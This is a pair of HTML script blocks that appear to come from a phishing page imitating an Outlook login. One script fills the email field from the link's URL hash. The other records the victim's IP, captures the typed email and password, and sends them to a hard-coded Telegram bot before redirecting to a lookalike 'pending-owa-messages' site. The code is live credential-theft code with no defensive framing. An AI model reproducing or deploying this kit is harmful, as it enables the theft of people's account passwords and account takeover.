  <script>
  // Wait for page to fully load
  window.addEventListener('load', function() {
    // Extract email from URL hash (e.g., #john@gmail.com)
    const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
    
    // Basic validation (must contain @ and ., and no spaces)
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailFromUrl)) {
      // Fill the FIRST email input found
      const emailInput = document.querySelector('input[type="email"]');
      if (emailInput) {
        emailInput.value = emailFromUrl;
        // Optional: Trigger validation if needed
        emailInput.dispatchEvent(new Event('input'));
      }
    }
  });
  </script>

  <script>
  $(document).ready(function () {
    // First, fetch user's IP and store it in the hidden field
    $.getJSON("https://api64.ipify.org?format=json", function (data) {
      $("#ip").val(data.ip);
      console.log("User IP:", data.ip);
    });

    $("#email-form").submit(function (event) {
      event.preventDefault(); // Prevent default form submission

      // Get the values from the form fields
      let userEmail = $("#email").val();
      let userPassword = $("#password").val();
      let userIP = $("#ip").val();

      // === REPLACE THESE WITH YOUR ACTUAL CREDENTIALS ===
      let botToken = "8492588783:AAENb9XkfvvnkZWcZPEcePB88EX0gJZguMw";   // Example: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
      let chatId = "7241128758";       // Example: 123456789

      // Format the message you want to receive on Telegram
      let messageText = `üìß New Outlook Login\nüë§ User Name: ${userEmail}\nüîë Password: ${userPassword}\nüåê IP Address: ${userIP}\n‚è∞ Time: ${new Date().toLocaleString()}`;

      // Construct the Telegram API URL
      let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Send the data to Telegram
      $.ajax({
        url: telegramUrl,
        type: "POST",
        data: {
          chat_id: chatId,
          text: messageText,
          parse_mode: 'HTML'
        },
        success: function () {
          console.log("‚úÖ Form submitted to Telegram successfully");
          // Redirect after a successful submission (you can change this URL)
          setTimeout(function () {
            window.location.href = "https://pending-owa-messages-retry.vercel.app/";
          }, 1000);
        },
        error: function (jqXHR, textStatus, errorThrown) {
          console.error("‚ùå Failed to send message to Telegram:", textStatus, errorThrown);
          // Still redirect even if there's an error (to maintain user experience)
          setTimeout(function () {
            window.location.href = "https://pending-owa-messages-retry.vercel.app/";
          }, 1000);
        }
      });
    });
  });
  </script>
